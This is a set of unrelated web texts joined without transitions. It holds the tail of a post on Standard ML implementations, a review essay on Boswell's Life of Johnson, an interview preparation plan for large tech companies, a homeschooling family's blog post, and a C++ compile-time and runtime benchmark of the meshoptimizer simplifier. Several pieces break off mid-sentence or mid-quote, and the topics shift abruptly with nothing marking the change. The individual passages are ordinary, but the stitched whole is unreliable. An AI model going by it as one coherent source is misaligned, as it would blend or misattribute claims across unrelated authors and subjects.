</p><p>Furthermore, the last few years have welcomed some entirely new
implementations. <a href="https://github.com/KeenS/webml">WebML</a>, by a
prominent open source hacker, is written in Rust and compiles Standard
ML to WebAssembly. <a href="https://sosml.org/">SOSML</a> is an interpreter
written in TypeScript by former students of Saarland University. It
features <a href="https://sosml.org/editor">a nifty online
IDE</a>.</p>
<p>
  A commenter
  shared <a href="https://github.com/SomewhatML/sml-compiler">SomewhatML</a>,
  an actively developing compiler for Standard ML written in Rust.
</p><p>There have also been some new experimental spins on Standard ML in
the last few years. <a href="https://github.com/julianhyde/morel">Morel</a> is an
interpreter with some nice syntax extensions written in Java by the
author of Apache Calcite. And <a href="https://github.com/elpinal/bright-ml">Bright
ML</a> is a spin on Standard ML and
OCaml written in Standard ML (and using the abandoned <a href="https://mosml.org/">Moscow
ML</a> compiler of all implementations).</p>
<p>So if you're looking for an easy intro to the ML family of languages,
I still recommend the simplicity and performance of Standard ML and
its small but definitely, surprisingly, not dead community. :)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

          <p>This interview preparation plan contains notes that apply to any company and specifics for my target companies.
I planned to interview with my target companies Airbnb, Facebook, and Google at once. I wanted to have the onsites close to each other (with at
least one day to rest between interviews) to maximize my chances to get into a big company.
I got excellent recruiters that helped me schedule the 3 on-sites in 2 weeks.
I was able to pass all of the Hiring Committees and got offers from Airbnb, Facebook, and Google.
Disclaimer: <em>This plan worked for me. It might or might not work for you</em>.</p>

<h2 id="before-you-start">Before you start</h2>
<p><strong>Preparing</strong> for an interview is a rewarding, stressful, and exciting experience. Passing an interview could be the outcome of enough focused preparation
(luck is involved too, but I’ll get to this shortly).
The process is stressful on every single stage from the first time you send your resume and wait for the automated program or the recruiter not to reject it
until the last day you negotiate your offer with your recruiter. However, the process is rewarding because you improve your problem-solving skills, also,
the concepts that you learn when you’re preparing for the system design interviews are invaluable and will be helpful throughout your career.</p>
<p><strong>Luck is involved in the interview process</strong>. You may have prepared a lot but:</p>
<ul>
<li>you might get stage fright during the interview, you can decrease the anxiety effect with enough practice, but I guess that this feeling will always be there</li>
<li>you might be unable to make progress because the problem is too hard to solve because you didn’t practice that topic enough, or you just missed that small insight</li>
<li>there might be an external factor that you can’t control; for example, you might not click with your interviewer, your interviewer might be having a bad day or
during the Hiring Committee review, someone dislikes something about your round even though all the interviewers gave you a positive score
(as an anecdote <a href="https://youtu.be/r8RxkpUvxK0?t=530">not even the Hiring Committee members are safe from themselves</a>).</li>
</ul>
<p>You increase your chances of landing a job at a top company if you interview with more of them. It may seem obvious, but it
took me some courage to attempt more times because I was afraid of rejection,
it helped to switch my mentality to focus more on the preparation rather than the result.</p>
<p>For stage fright, practice a lot either at pramp or with a friend experienced in interviews (highly recommended),
the more you practice, the better you’ll become at communicating your solution as well as keeping control of the time,
when I started, I could come up with a solution for a coding problem, but I’d present it in a disordered way, I’d explain a solution and start coding it right
away without realizing that I was solving the wrong problem or I’d talk too much without considering the time, and I’d eat valuable time in the interview that I could
use for the follow-up question or tests, when I practiced system design interviews, I’d jump across the system design
stages or I’d go way too deep into the detailed design when I talked about the high-level design. After I did enough mock
interview rounds with my friend, I corrected these problems and came up with a systematic way to tackle each coding and system design problem.</p>
<p>For challenging problems, always try to come up with examples. I got follow-up questions where I didn’t know where to start,
so after cycling through some data structures and algorithms I’d write some examples, I’d find a pattern, and finally,
the data structures and algorithms that would help me solve the problem. If you can’t make progress, ask for help! If you get
an excellent interviewer, he/she might realize you need help and give you hints but in any case, keep this step as a last resort when you’re completely stuck.</p>
<p>For external factors, there’s nothing you can do. Just focus your energy on the next interview instead of thinking about what you could’ve done better.</p>
<p>Finally, my journey wasn’t without failures. I failed multiple interviews with top companies, I was naive in the past, and when I decided to
go for an interview I’d “put all of my eggs in one basket” (meaning interviewing only with one company at a time in years) and fail but
now I realize that the interview process gave me invaluable information that helped me in my next attempts,
if you fail, it just means that you’ve failed that attempt. After all of your rounds, reflect on what you did right and wrong and focus on improving
that part for the next shot.</p>
<div>
<div>
<p><span>Luck</span> is what happens when <span>preparation</span> meets <span>opportunity</span></p>
<p><i>Seneca</i></p>
</div>
</div>
<p>Getting an offer is not the end of the journey. It might be possible that even after you reach your target company and you
work there for some years, you might look for new challenges in other top companies. The interview skill is something
that you should keep up to date. Good luck!</p>
<h2 id="summary">Summary</h2>
<p><em>(If you haven’t interviewed in the past and wanna get noticed)</em></p>
<ul>
<li>If you’re a student, enjoy the student lifestyle! Work on challenging projects that make you stand out from the rest.
In my case, I used to be a competitive programmer and was also really into creating my
projects for fun, <a href="https://javascriptweekly.com/issues/194">I managed to have a JS library featured in a magazine once!</a>,
(<a href="https://mauriciopoppe.github.io/PojoViz/public/vulcanize.html#readme">link to the project</a>).</li>
<li><a href="https://www.youtube.com/watch?v=ueNT-w7Oluw">Participate in Coding Contests</a>, I solved thousands of problems over the years;
my solutions are in <a href="https://github.com/mauriciopoppe/competitive-programming">this repo</a>.</li>
<li>Google has this website called <a href="https://foobar.withgoogle.com/">https://foobar.withgoogle.com/</a> (learn about it <a href="https://medium.com/plutonic-services/things-you-should-know-about-google-foobar-invitation-703a535bf30f">here</a>).
When I was reading about web performance, I saw a pink button somewhere inside the <a href="https://developers.google.com/web/fundamentals/performance/rendering">Web Fundamentals Rendering Performance Guides</a>
which led me to the foobar site, I solved 3 problems in python and got an interview invitation and then I solved the remaining 2 and got more invitations to give to friends.</li>
<li>If you are working full-time, look for opportunities to work on challenging problems and show leadership, <strong>take the chance, no pain, no gain</strong>.</li>
<li>Make sure your resume shines and aim for a 1-page resume, <a href="https://www.overleaf.com/read/fvdmbqtskgsw">here’s the CV I used for this round (with my details removed)</a>.</li>
</ul>
<p>Before looking to interview:</p>
<ul>
<li>Do the daily Leetcode challenge. It’s a great way to keep the coding interview skill up to date</li>
<li>Participate in Leetcode contests every Saturday, or Codeforces when it’s available</li>
<li>Read about or code scalable systems, read interesting papers and read the red book <a href="https://dataintensive.net/">Designing Data Intensive Applications</a>,
I focused a lot on this part since the last time I failed my previous onsite was because of system design.</li>
<li>Get to know me and the places I’d like to work, check if my values match the company core values</li>
</ul>

<div>
    <p>
        In the Facebook HQ you see their core values everywhere. One phrase that stuck with me in one of their buildings is <em>what would you do if you weren’t afraid?</em>.
A few of my friends have been working there for a long time, Facebook’s been one of my target companies for a while, <a href="https://engineering.fb.com/">their engineering blog</a> is filled with
so many gems across multiple fields. As a Frontend developer, I learned a lot from <a href="https://engineering.fb.com/web/browserlab-automated-regression-detection-for-the-web/">Browserlab</a>
whose infrastructure design I used as inspiration in a project I did at work with <a href="https://www.webpagetest.org/">WebPagetest</a>.
    </p>
</div>
<div>
    <p>
        I use a lot of Google products every day, and I admire their high quality. Google’s always setting standards in engineering in the industry
and ensuring that their research is available to the world. Many companies, including mine, have benefited from all the open-source projects they
produce/support. <a href="https://kubernetes.io/">Kubernetes</a> is the core component in many companies’ infra, and it looks like a magic box to the engineers that use it.
    </p>
</div>
<p>NOTE about picking your companies: I only interviewed with the companies I wanted to work for, which is risky. Another strategy is to apply to all the top
companies hoping to get multiple offers, which helps during the negotiation phase. During my preparation, I watched videos from various founders
from all of the top companies and discovered that I’d like to work at <a href="https://www.youtube.com/watch?v=NprBQi0cSHU">Stripe</a> too.</p>
<p>When I was ready to interview</p>
<ul>
<li>Contact the recruiters, schedule phone screens in 3 to 4 weeks. More time to prepare for the phone screen is risky
because I’ll burn out even before practicing the system design questions.</li>
<li>Practice only coding for the phone screens. The plan is detailed below.</li>
<li>After the phone screen interviews, schedule on sites in 4 to 6 weeks (I did 4 weeks), I also ensured that the onsites
were as close as possible to a target date with enough breathing room to rest.</li>
<li>Practice mainly system design and coding to a less extent, give yourself enough breathing room not to burn out.</li>
<li>Practice behavioral types of questions. Each company has its way to assess this part that’s described below.</li>
<li>Go through the onsites, get to a mental state where you’re ready for the next interview regardless of the outcome of the previous round.</li>
<li>Receive feedback from the recruiters and the HC, go through the team matching interviews if you passed the HC, remember that <strong>you don’t have an offer yet</strong>.</li>
<li>If you get offers, learn to negotiate, read <a href="https://candor.co/guides/salary-negotiation">Salary negotiation strategies everyone in tech already knows — but you don’t</a>, <a href="https://medium.com/@bayareabelletrist/how-i-negotiated-a-software-engineer-offer-in-silicon-valley-f11590f5c656">How I negotiated a $300,000 job offer in Silicon Valley</a>, and/or
get professional help.</li>
<li>If you don’t get an offer, learn from your mistakes, and move on, you’ll have enough time to reflect and think about the plan for the next attempt.</li>
</ul>

<p>My wife and I currently homeschool three of our four school-aged kids. We plan to ultimately homeschool all of our children for at least some portion of their early education, possibly through high school.</p>



<div><figure><img loading="lazy" width="640" height="360" src="https://173.199.178.7/wp-content/uploads/2018/12/public-school-buses-educating-children.jpg" alt="School Bus Kids to School or Teach Them at Home?" srcset="https://prosperopedia.com/wp-content/uploads/2018/12/public-school-buses-educating-children.jpg 640w, https://prosperopedia.com/wp-content/uploads/2018/12/public-school-buses-educating-children-300x169.jpg 300w" sizes="(max-width: 640px) 100vw, 640px"></figure></div>



            <p>We often have had to defend our decision to homeschool over the past six years following our decision to take our kids out of the school system and teach them (more appropriately, create an environment for them to learn) in our home and in other family settings. Although the culture and attitude towards homeschooling are much different now than they were when I was in school in the 1980s and 90s, there is still a significant amount of stigma attached to scenarios where children are kept out of the normal school system. As I’ve done on many occasions responding to inquisitive people, I will explain why my wife and I chose to homeschool our children as an alternative to having them attend public schools, charter schools, or private schools, and why we continue with that educational approach after six years of doing so.</p>



<p>The decision we made in 2012 to break from the ranks of those parents who send their children off to school and enjoy 7-8 hours of free time (for stay at home moms; dads are usually away at work anyhow) meant that we’d need to take on an entire new career for both my wife and me. We added to our roles as parents, protectors, and providers for our kids the responsibility of being academic instructors for them as well, raising the stakes of what it means for us to be responsible for the development of each and all of our children.</p>



<h2><strong>Some Background About Us</strong></h2>



<p>My wife and I were educated in public schools. Both of us were involved in lots of activities that kept us busy nearly year round.</p>



<p>Throughout my grade school years, I wrestled and played baseball, football, basketball, and other sports. Although I have always enjoyed learning, I wasn’t a very serious student all the way through high school. I did make sure to do enough to keep my grades high because of my parents’ expectations, knowing in the back of my mind that it would someday be important for college, the place where careers were said to be made. I really enjoyed the social life. I loved the independence I found each morning as I headed off to school, checked in with all my buddies, flirted and hung out with the girls, and navigated life as a youth making his way toward adulthood.</p>



<div><figure><img loading="lazy" width="300" height="141" src="https://35.192.111.215/wp-content/uploads/2018/12/high-school-graduation-300x141.jpg" alt="" srcset="https://prosperopedia.com/wp-content/uploads/2018/12/high-school-graduation-300x141.jpg 300w, https://prosperopedia.com/wp-content/uploads/2018/12/high-school-graduation-768x361.jpg 768w, https://prosperopedia.com/wp-content/uploads/2018/12/high-school-graduation.jpg 953w" sizes="(max-width: 300px) 100vw, 300px"></figure></div>



<p>The public school systems in Florida/Utah (for me) and Texas (where my wife grew up) weren’t necessarily bad for us. I did get into more than my fair share of fights at school in Florida before my parents moved my family to Utah. I also remember watching lots of Andy Griffith reruns during chemistry classes, and I recall often getting permission from my physics teacher to skip class and head over to the school weight room to test out theories about gravity.</p>



<p>When I met and married my wife, I never recall her ditching on her public school education. She had good memories of cheerleading, friends, and striving for straight A’s.</p>



<p>After high school, we both attended college (where we met), and we both obtained college degrees. Based on that background, you might say that my wife and I are both pretty standard products of the American schooling system.</p>



<p>However, here we are, homeschool parents. </p>



<p>Here’s how that happened.</p>



<h2><strong>A Spiritual, Faith-Based Environment for Education</strong></h2>



<div><figure><img loading="lazy" width="640" height="426" src="https://173.199.178.7/wp-content/uploads/2018/12/spiritual-faith-based-education-important.jpg" alt="Spiritual, Faith-Based Education Important" srcset="https://prosperopedia.com/wp-content/uploads/2018/12/spiritual-faith-based-education-important.jpg 640w, https://prosperopedia.com/wp-content/uploads/2018/12/spiritual-faith-based-education-important-300x200.jpg 300w" sizes="(max-width: 640px) 100vw, 640px"></figure></div>



<p>Just before my own graduation from Orem High School in 1994, I was asked by one of the officers of my senior class to give an “unofficial” prayer as we prepared to make our way into the civic center where we would listen to speeches and receive our diplomas. It seemed strange to me that we were not allowed to participate in a prayer as a part of the official proceedings, and that we had to sort of “sneak” one in prior to the graduation ceremony.</p>



<p>Since my graduation, I have become much more committed to religion, even more so as I became an imperfect parent needing divine direction to raise my children. My wife and I are a highly religious couple, which means that we have always considered education to be as much or more a spiritual matter as a secular one. </p>



<p>As we all well know, today’s public school system is no place for religion, no place for prayer, no place for scriptures. In contrast, my wife and I are certain that an education that attempts to instruct the mind without providing eternal perspective and training the heart and soul falls far short of its potential.</p>



<p><strong>One of the most important reasons we homeschool our kids is to instill in them our deeply held religious values.</strong></p>



<p>That one priority rules out public schools and charter schools, both of which are funded by tax dollars, which means that neither of those options is allowed to use a faith-based perspective for educating.</p>



<h2><strong>What About a Christian Private School?</strong></h2>



<p>When our oldest child was three years old, my wife and I decided to move a half hour away to the north part of our county specifically to be closer to a locally well-known Christian (LDS) private school called American Heritage School. We had toured the school and felt great about its commitment to solid religious and secular education as well as its emphasis on the principles of freedom promoted by the Founding Fathers of this country.</p>



<div><figure><img loading="lazy" width="300" height="184" src="https://35.192.111.215/wp-content/uploads/2018/12/american-heritage-utah-christian-private-school-300x184.jpg" alt="American Heritage Utah Christian Private School" srcset="https://prosperopedia.com/wp-content/uploads/2018/12/american-heritage-utah-christian-private-school-300x184.jpg 300w, https://prosperopedia.com/wp-content/uploads/2018/12/american-heritage-utah-christian-private-school-768x471.jpg 768w, https://prosperopedia.com/wp-content/uploads/2018/12/american-heritage-utah-christian-private-school.jpg 800w" sizes="(max-width: 300px) 100vw, 300px"></figure></div>



<p>We enrolled our daughter in American Heritage School as a kindergartner, and she attended there for three years, including as a second grader while her younger brother, our oldest son, attended kindergarten. They both loved proudly wearing their school uniforms and going off to school each day.</p>



<p>In fact, we love the school so much that whenever we have a child ready to start school and enter kindergarten, we put him into American Heritage School. This gives them a chance to build some independence and experience the excitement of being part of a school community. &nbsp;Then, as has been our tradition, the following school year, we put them back into our homeschool system, where they learn beside their siblings and parents.</p>



<p>Despite how much we enjoyed American Heritage School, having our kids spend 7-8 hours a day, five days a week there didn’t fit our needs.</p>



<h2><strong>Building Family Relationships</strong></h2>



<p>My wife has been reading and telling me about a fascinating book called <a href="https://amzn.to/2RcuRMx"><em>Hold On To Your Kids: Why Parents Need to Matter More Than Peers</em></a>. The book details the dangers of peer orientation among youth and encourages affected parents to earn back their kids loyalty and love so that they don’t become victims of a peer group that severely damages their development and well-being.</p>



<p><a href="https://amzn.to/2RcuRMx"><em>Hold On To Your Kids </em></a>articulates well what we’ve felt motivated to do since our oldest started going to school. It is important to us as parents that our kids trust us, that they develop a close relationship with us as friends, mentors, and confidants. It is also important that they establish strong bonds among their siblings, so that they can continue to provide support for each other throughout their lives. The family unit is naturally that protective and nurturing shelter designed for giving kids their best chances at success.</p>



<p>My wife and I are both into sports. We love to play and watch football, baseball, basketball, and other sports. Our kids also naturally love sports, which means that we spend a lot of time at practices and games.</p>



<p>We also decided early on in our marriage that music would be a big component of our family. Each of our children begins learning a musical instrument by age six.</p>



<p>While my two oldest were attending American Heritage School, we found that we were simply short on time. We would send our kindergartner and 2nd grader to school for a large portion of the day, then having them practice their musical instruments, participate in sports, finish homework, and do chores, we found that there was simply too little time for us to spend with each of them before it was time for them to go to bed.</p>



<p>Often when people ask me why my kids are not “in school”, my reply is simply this: “We don’t have time for it.” </p>



<p>That may sound to some like a lame reason to keep kids out of school (especially a great, highly affordable private school), but really is a legitimate concern for a busy family. When our kids were in school, even one that we loved being associated with, their schedules were too full to allow us to have the critical time left over at the end of the day to develop important relationships between them and us as their parents.</p>



<h3>My daughter was able to spend enough time on her viola to qualify for a solo with her orchestra at 11 years old.</h3>



<figure><div>

</div></figure>


<p><span>Teaching kids at home can be done much more efficiently than in a classroom setting. Sending them off to a school where they are learning with 15 – 30 other kids whose interests and aptitudes vary widely simply cannot compete with the efficiency that’s possible with homeschooling. I’ve seen estimates that only one-third of the time (an average of about 6 hours per day across the nation) kids are at school is actually spend doing valuable learning activities. </span><a href="https://monkeymum.blog/2015/09/13/time-is-precious/"><span>One mom’s calculations estimate</span></a><span> puts actual instruction time spent in most classrooms at only 100 minutes (less than two hours) per day.</span></p>
<p><span>When kids are able to learn in an efficient way in the home, they can quickly work through what we consider mandatory, and they have more free time to spend with their siblings and parents as well as their friends. This has become more difficult for us as we’ve added more kids to the mix, and we are constantly looking for ways to watch and interact with the littlest ones while giving guidance, feedback, motivation, and discipline to our older ones. It helps that my career allows me to work from home and often step in to help my wife with her roles.</span></p>

17 Jan 2019

</span></p><p>A library that I work on often these days, <a href="https://github.com/zeux/meshoptimizer">meshoptimizer</a>, has changed over time to use fewer and fewer C++ library features, up until the current state where the code closely resembles C even though it uses some C++ features. There have been many reasons behind the changes - dropping C++11 requirement allowed me to make sure anybody can compile the library on any platform, removing <code>std::vector</code> substantially improved performance of unoptimized builds, removing <code>algorithm</code> includes sped up compilation. However, I’ve never quite taken the leap all the way to C with this codebase. Today we’ll explore the gamut of possible C++ implementations for one specific algorithm, mesh simplifier, henceforth known as <code>simplifier.cpp</code>, and see if going all the way to C is worthwhile.</p>

<!--more-->



<p>Mesh simplifier is an implementation of an edge collapse quadric based simplification algorithm with many tweaks to improve performance and quality of the result. The algorithm is still in development but has had a fair share of effort put into it. The details are really not that important, but it helps to understand the structure and size:</p>

<ul>
  <li>The entire algorithm is implemented in one standalone .cpp file that has almost exactly a thousand lines of code (1004 as of this writing), including comments, blank lines, lines with braces, etc.</li>
  <li>The algorithm almost exclusively uses heap-allocated arrays as data structures, using raw pointers for this</li>
  <li>The algorithm needs a hash table and a sorting routine, implemented from scratch</li>
</ul>

<p>We will look at several variations of the implementation, starting with one that uses C++ containers and algorithms that would be helpful for that algorithm, then remove one C++ feature at a time and measure compilation speed and runtime performance as we go on three compilers, gcc 7.3, clang 6 and msvc 2017 on Core i7-8700K running Windows 10 / Ubuntu 16.10. We’ll measure compilation performance by just compiling one .cpp file (with default options in debug and <code>-O2</code> optimization level in release), and measure runtime performance by simplifying <code>buddha.obj</code> (1M triangle mesh) to 25% of its size. After we reach the current implementation, we will explore the option of changing the code to pure C99.</p>

<blockquote>
  <p>Note that the way I arrived at these implementations is by taking the code you can see in the repository right now, and changing it to be more idiomatic Modern C++<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. However, these are generally very close to past versions of <code>simplifier.cpp</code> - the difference being that it’s possible to directly compare the variants now.</p>
</blockquote>



<p>The version we’re starting with is the original <code>simplifier.cpp</code> from <a href="https://github.com/zeux/meshoptimizer/blob/c93ba0987baa84bd73b61edf1c0ba7ba2e48df4b/src/simplifier.cpp">current meshoptimizer master</a>, with the following modifications:</p>

<ul>
  <li>All raw pointers changed to <code>std::vector</code></li>
  <li>Instead of a home-grown hash table we use <code>std::unordered_set</code></li>
  <li>Instead of a home-grown sorting routine we use <code>std::sort</code></li>
</ul>

<p>Here’s the performance that we’re getting as a result:</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>520 ms</td>
      <td>646 ms</td>
      <td>2273 ms</td>
      <td>572 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>400 ms</td>
      <td>684 ms</td>
      <td>2356 ms</td>
      <td>566 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>400 ms</td>
      <td>725 ms</td>
      <td>1535 ms</td>
      <td>584 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>422 ms</td>
      <td>566 ms</td>
      <td>36317 ms</td>
      <td>579 ms</td>
    </tr>
  </tbody>
</table>

<p>This is a good starting point. We can see that performance is pretty solid in release - 0.6 seconds to decimate 1M triangle mesh is a good level of performance - generally more or less reasonable in debug with a notable exception of MSVC (the adverse behavior of MSVC STL in debug mode was one of the forcing functions to remove all STL use from meshoptimizer), and compile times generally vary but are uninspiring.</p>

<p>To put the compile times in perspective, Jonathan Blow recently posted a <a href="https://youtu.be/iD08Vpkie8Q?t=4984">video stream with compiler performance improvements</a>, where his game engine and game written in his new language compile and link in about a second (compilation itself takes about 0.9 seconds). That’s on a codebase that has 100K lines of code - our algorithm only has 1K lines of code (excluding STL, of course - it’s not entirely fair to exclude STL, but it’s not entirely fair to include STL either since we know our algorithm can be implemented in 1K LOC without any STL dependencies). 400 ms is something you notice when compiling your code, even if it’s just one file, and something that makes me less happy when working on the code - given many files like that, cumulative compilation performance can be bad. This is given the fact that our implementation is pretty spartan about the STL dependencies - we only use three algorithms/containers. Let’s see what happens when we stop using one of them.</p>



<p>The secret about the previous version we benchmarked is that it never existed in that form. While meshoptimizer initially used STL containers and algorithms, it never used <code>std::unordered_set</code> - that’s because based on prior experience I expected the performance to be insufficient for the kinds of algorithms I wanted to write, and had a custom replacement that was using quadratic probing in a large power of two sized array, which is similar to Google’s <code>dense_hash_set</code> design. It’s a kind of hash table I use and implement often in different codebases for different applications, so I’m very familiar with it. The implementation in <code>simplifier.cpp</code> is just 35 lines of code<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, so it’s easy to drop in and adapt for the use case at hand. Let’s see what happens when we use that instead.</p>

<p>It looks like the extra 35 lines for a manual implementation of a better hash table were worth it. We’re seeing significant performance improvements across the board, in debug/release and both in terms of compile time and run time. The largest increase in runtime performance is on MSVC, we got 1.5x faster, and this is given the fact that hash table isn’t used as a core part of the algorithm - it’s only used to establish uniqueness relationship between individual vertices before the algorithm starts.</p>

<p>This highlights the poor fit of <code>std::unordered_set</code> to performance-critical workloads, especially ones that are insert-heavy. Unfortunately, this is not an implementation defect and thus is not possible to correct - the issue is that the standard requirements on unordered containers preclude more efficient implementations. Here’s to hoping that eventually we’ll get a better hash table in the standard.</p>



